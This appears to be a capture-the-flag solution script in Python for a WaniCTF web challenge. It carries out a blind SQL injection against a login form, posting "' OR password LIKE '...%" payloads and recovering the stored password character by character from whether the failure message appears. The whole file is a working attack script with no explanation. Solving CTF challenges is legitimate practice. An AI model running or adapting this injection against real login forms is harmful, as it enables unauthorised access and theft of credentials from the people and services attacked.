import requests
import string

with requests.Session() as session:
    r = session.get("https://watch.web.wanictf.org/")
    chars = string.printable
    chars = chars.replace('%','')
    chars = chars.replace('_','')
    password = ""
    while True:
        for c in chars :
            data = {'email':'wanictf21spring@gmail.com', 'password': "' OR password LIKE '"+ password + c + "%"}
            r = session.post("https://watch.web.wanictf.org/",data=data)
            if "Login Failed..." not in r.text :
                break
        if c == chars[-1]:
            break
        password += c
        print(password)